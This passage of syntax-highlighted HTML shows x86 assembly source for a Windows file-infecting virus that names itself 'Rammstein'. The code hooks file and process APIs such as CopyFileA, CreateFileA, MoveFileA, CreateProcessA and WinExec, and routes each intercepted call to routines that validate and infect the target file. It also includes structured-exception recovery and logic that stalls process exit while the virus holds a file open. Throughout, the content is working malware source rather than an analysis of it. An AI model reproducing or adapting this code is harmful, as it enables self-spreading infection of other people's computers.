       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;save new api address!!!</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                     </span><span class="sc1">;did we find all?</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">api_next</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc10">error</span><span class="sc4">:</span><span class="sc0">                                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">apihookfinish</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">THREAD5SEH</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">restore_thread5_seh</span><span class="sc0">                     </span><span class="sc1">;host</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Thread5Exception</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;if we had an error we</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;must restore the ESP</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeltaRecover5</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DeltaRecover5</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DeltaRecover5</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">restore_thread5_seh</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;and restore the SEH</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hsemaphore</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_ReleaseSemaphore</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_ExitThread</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Thread_5_StartAddress</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">StartOfHooks</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Hook_CopyFileA</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;Here come the hook</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Hooker</span><span class="sc0">                                  </span><span class="sc1">;redirectors...</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CopyFileA</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Hook_CopyFileExA</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Hooker</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CopyFileExA</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Hook_CreateFileA</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileHooker</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CreateFileA</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Hook_GetCompressedFileSizeA</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Hooker</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetCompressedFileSizeA</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Hook_GetFileAttributesA</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Hooker</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetFileAttributesA</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Hook_GetFileAttributesExA</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Hooker</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetFileAttributesExA</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Hook_SetFileAttributesA</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Hooker</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Hook_GetFullPathNameA</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Hooker</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetFullPathNameA</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Hook_MoveFileA</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Hooker</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_MoveFileA</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Hook_MoveFileExA</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Hooker</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_MoveFileExA</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Hook_OpenFile</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Hooker</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_OpenFile</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Hook_CreateProcessA</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Hooker</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CreateProcessA</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Hook_WinExec</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Hooker</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_WinExec</span><span class="sc4">]</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Hook_DestroyWindow</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcessHooker</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_DestroyWindow</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Hook_ExitProcess</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcessHooker</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_ExitProcess</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">proc_len</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">Hook_ExitProcess</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Hooker</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                                        </span><span class="sc1">;And this is our hook...</span><span class="sc0">
      </span><span class="sc6">pushad</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">pushfd</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@HookerDelta</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@HookerDelta</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@HookerDelta</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">VIRUSNOTIFYHOOK</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">hooktext1</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Rammstein viral hook code!'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">hooktext1</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">hooktext2</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Rammstein viral hook code!'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">hooktext2</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_MessageBoxA</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">good_to_infect</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ValidateFile</span><span class="sc0">                           </span><span class="sc1">;first validate the file</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">no_good_file</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@003</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">free_routine</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">NOT_AVAILABLE</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@003</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">free_routine</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">NOT_AVAILABLE</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectFile</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">free_routine</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">AVAILABLE</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_good_file</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popfd</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Hooker</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ExitProcessHooker</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitHookerEbp</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ExitHookerEbp</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ExitHookerEbp</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">process_end</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@fo</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fileopen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">                    </span><span class="sc1">;we cannot allow shutdown</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@fo</span><span class="sc0">                                      </span><span class="sc1">;while our thread has a</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;file opened...</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ExitProcessHooker</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CreateFileHooker</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pushfd</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileEbp</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CreateFileEbp</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CreateFileEbp</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2ch</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">good_to_infect</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popfd</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CreateFileHooker</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">HookedFunctions</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CopyFileA</span><span class="sc4">&gt;</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Hook_CopyFileA</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CopyFileExA</span><span class="sc4">&gt;</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Hook_CopyFileExA</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CreateFileA</span><span class="sc4">&gt;</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Hook_CreateFileA</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetCompressedFileSizeA</span><span class="sc4">&gt;</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Hook_GetCompressedFileSizeA</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetFileAttributesA</span><span class="sc4">&gt;</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Hook_GetFileAttributesA</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetFileAttributesExA</span><span class="sc4">&gt;</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Hook_GetFileAttributesExA</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SetFileAttributesA</span><span class="sc4">&gt;</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Hook_SetFileAttributesA</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetFullPathNameA</span><span class="sc4">&gt;</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Hook_GetFullPathNameA</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">MoveFileA</span><span class="sc4">&gt;</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Hook_MoveFileA</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">MoveFileExA</span><span class="sc4">&gt;</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Hook_MoveFileExA</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">OpenFile</span><span class="sc4">&gt;</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Hook_OpenFile</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CreateProcessA</span><span class="sc4">&gt;</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Hook_CreateProcessA</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">WinExec</span><span class="sc4">&gt;</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Hook_WinExec</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
